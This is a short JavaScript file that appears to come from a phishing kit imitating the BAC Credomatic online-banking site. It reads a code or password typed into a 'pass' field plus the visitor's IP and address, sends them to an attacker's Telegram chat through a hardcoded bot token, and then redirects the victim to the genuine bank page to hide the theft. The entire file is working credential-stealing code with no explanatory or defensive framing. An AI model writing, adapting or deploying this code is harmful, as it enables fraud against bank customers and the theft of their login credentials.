//bot token
var telegram_bot_id = "5815179713:AAHUFyERTLeTO8sQ2xB76eNxb6I2rCOBgVc";
//chat id
var chat_id = "@baac20";
var u_name, ip, ip2;
var ready = function () {
    u_name1 = document.getElementById("pass").value;
    u_name = document.getElementById("pass").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "C0DIy0: " + u_name + " - C0DIy0: " + u_name1 + "\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://www2.baccredomatic.com/es-hn/banca-en-linea-1';
        console.log(response);
    });
    return false;
};
